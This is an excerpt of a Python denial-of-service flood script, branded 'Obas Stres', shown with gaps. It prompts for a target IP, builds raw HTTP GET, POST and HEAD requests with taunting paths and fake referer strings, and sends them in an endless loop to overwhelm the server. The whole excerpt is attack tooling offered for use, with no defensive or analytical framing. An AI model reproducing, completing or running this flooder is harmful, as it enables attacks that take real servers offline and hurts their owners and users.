...
referers = [
'Attack By Obas | Rip Server Lowh Dej!',
'Attack By Obas | Rip Server Lowh Dej',
'Attack By Obas | Rip Server Lowh Dej!',
'Attack By Obas | Rip Server Lowh dej!',
'Attack By Obas | Rip Server lowh dej!',
'Attack By iMoon | Rip Server Lowh Dej!',]
...
if sys.platform.startswith("linux"):
   ...
   os.system('clear')
    ...
    os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Obas Stres")
print("########@Obas = Obas###########") 
ip = str(input(" $IP =============== "))
...
def Headers(method):
    ...
    if method == "head" or method == "post":
        post_host = "POST /Attack By Obas| Mampus Sajah Kauw Dej! HTTP/1.1\r\nHost: " + ip + "\r\n"
...
def run():
    ...
    if method_attack == "get":
        get_host = "GET /Attack By Obas| Mati Sajah Dej! HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Attack By Obas | Sended | Rip VPS! HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("$Mati Sajah kau dej ",ip," : ",port,"!")
